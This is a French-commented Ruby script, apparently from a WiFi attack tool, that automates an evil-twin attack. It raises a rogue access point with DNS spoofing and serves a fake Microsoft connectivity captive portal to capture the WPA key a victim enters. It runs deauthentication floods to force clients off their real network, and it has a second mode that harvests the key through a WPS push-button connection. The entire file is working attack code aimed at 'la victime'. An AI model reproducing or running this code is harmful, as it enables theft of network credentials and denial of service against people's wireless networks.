#!/usr/bin/env ruby


require 'open3'
require 'highline/import'
require 'shellwords'
require 'colorize'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... nettoyage des fichiers...\e[0m"
  Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
system("ruby exit.rb")
  exit 130
end




class Berate
def self.berateNormal
load 'check.rb'
puts "Lancement de berate_ap..."
system "berate_ap --mana-loud -n --redirect-to-localhost --ieee80211n -g 175.0.0.1 #{$carte} -c #{$canal} #{"#$ssid ".shellescape} &> /dev/null &"
sleep 20
piddnsspoofbis = spawn('dnsspoof -i ap0 &')
sleep 5
puts "\e[1;94m[*] Configuration du système de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3;
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Fake AP crée... préparation de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
Cle.cleWpa # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Fake AP crée... préparation de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.5FR'
sleep 1
Wps.boutonWps # Lancement de la DoS ici et du code qui attend la victime
end
end
end

class Cle
def self.cleWpa
  puts"Fonction clé wifi"
  file = "cartef.txt"
  if File.exist?("cartef.txt")
    puts "Lancement des interfaces wifi en mode monitor..."
load 'accessdosbis.rb'
sleep 1
`ip link set #{$cartef} down`
`iw dev #{$cartef} set type monitor`
sleep 2
`ip link set #{$cartef} up`
sleep 2
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 2
`ip link set #{$cartedos} up`
sleep 3
puts "Lancement de la deauth en 2.4GHz et 5GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
dosbis = Thread.new { `bash rundos5ghz.sh` }
sleep 1
Attente.cleWifi
else
  load 'accessdos.rb'
puts "Lancement de la seconde carte wifi en mode monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
sleep 3
puts "Lancement de la deauth en 2.4GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
Attente.cleWifi
end
end
end

class Wps
  def self.boutonWps
    puts"Fonction wps"
    file = "cartef.txt"
    if File.exist?("cartef.txt")
      puts "Lancement des interfaces wifi en mode monitor..."
  load 'accessdosbis.rb'
  sleep 1
  `ip link set #{$cartef} down`
  `iw dev #{$cartef} set type monitor`
  sleep 2
  `ip link set #{$cartef} up`
  sleep 2
  `ip link set #{$cartedos} down`
  `iw dev #{$cartedos} set type monitor`
  sleep 2
  `ip link set #{$cartedos} up`
  sleep 3
puts "Lancement de la deauth en 2.4GHz et 5GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
dosbis = Thread.new { `bash rundos5ghz.sh` }
sleep 1
Pbc.enAttenteduboutonwps
else
  load 'accessdos.rb'
puts "Lancement de la seconde carte wifi en mode monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
sleep 3
puts "Lancement de la deauth en 2.4GHz"
dos = Thread.new { `bash rundos.sh` }
sleep 1
Pbc.enAttenteduboutonwps
  end
 end
end

class Attente
  def self.cleWifi
load 'metcatcheck.rb'
    puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
loop do
sleep 1
if File.zero?("/var/www/msftconnecttest/cle.txt")
else
puts "\e[1;32m[*] La clé wifi WPA a été rentrée et sauvegardé dans le répertoire: /var/www/msftconnecttest/cle.txt\e[0m"
puts "\e[1;32m[*] Commande pour récupérer et sauvegarder la clé WPA: cat /var/www/msftconnecttest/cle.txt\e[0m"
puts "\e[1;32m[*] Clé wifi WPA-PSK:\e[0m"
Dir.chdir '/var/www/msftconnecttest'
sleep 2
File.open("cle.txt").readlines.each do |wpa|
   puts wpa.red
end
break
end
end
sleep 600
Dir.chdir '/tmp/hostbase-1.5FR'
  sleep 2
puts "\e[1;94m[*] Exit de hostbase... nettoyage des fichiers... pensez a regarder dans /var/www/msftconnecttest/cle.txt pour récupérer la clé wifi \e[0m"
system("ruby wpsexit.rb")
end
end

    class Pbc
      def self.enAttenteduboutonwps
        puts "Lancement de wash..."
  wash = Thread.new { `bash wash.sh` }
  sleep 3
  Dir.chdir '/tmp/hostbase-1.5FR'
  sleep 2
 load 'metcatcheck.rb'
  puts "En attente d'une connexion... ctrl+c pour sortir..."
  until File.read('wash.txt').include?('wps_selected_registrar')
  sleep 1
  end
  puts "\e[1;32m[*] Un utilisateur s'est connecté et le bouton WPS a été appuyé...\e[0m"
  puts "\e[1;32m[*] Arret de la DoS...\e[0m"
  Process.kill 15, File.read('/tmp/terminal.pid').to_i
  Process.kill 15, File.read('/tmp/hostbase-1.5FR/wash.pid').to_i
  `killall wash`
  if File.exist?("terminalfrequence.pid")
  sleep 1
  Process.kill 15, File.read('/tmp/hostbase-1.5FR/terminalfrequence.pid').to_i
  `killall wash`
  else
  nil
  end
  puts "Lancement de wpa_cli..."
  load 'historique.rb'
  `killall wash`
  `killall xterm`
  `killall sleep`
  `killall mdk3`
  `ip link set #{$cartedos} down`
  `iw dev #{$cartedos} set type managed`
  sleep 3
  `rfkill unblock all`
  `ip link set #{$cartedos} up`
  sleep 6
         puts "\e[1;32m[*] En attente de la clé wifi...\e[0m"
  `killall wpa_supplicant`
  Dir.chdir '/etc'
  sleep 1
  `rm -rf wpa_supplicant.conf`
  `cp -R /tmp/hostbase-1.5FR/wpa_supplicant.conf /etc/`
  sleep 1;
  `sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
  sleep 2
  `killall wash`
  wpacli = Thread.new do
    while true
      system "xterm -e wpa_cli wps_pbc #{$apmac}" # A CHANGER PAR $BSSID  # On lance wpa_cli et wps_pbc en tant que thread
      sleep(20) # Temps avant la relance de la commande
    end
  end
  Selection.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
   sleep(5000000)
  end

class Selection
  def self.wpsGrab
  Dir.chdir '/etc'
  sleep 2
  until File.read('wpa_supplicant.conf').include?('WPA')
  sleep 1
  end
  puts "\e[1;32m[*] La clé wifi WPA a été capturée et sauvegardé dans le répertoire: /etc/wpa_supplicant.conf\e[0m"
  puts "\e[1;32m[*] Commande pour récupérer et sauvegarder la clé WPA: cat /etc/wpa_supplicant.conf\e[0m"
  puts "\e[1;32m[*] Clé wifi WPA-PSK:\e[0m"
  File.open("wpa_supplicant.conf").readlines.each do |wpa|
     puts wpa
     `killall wpa_supplicant`
  end
  end
  end
end
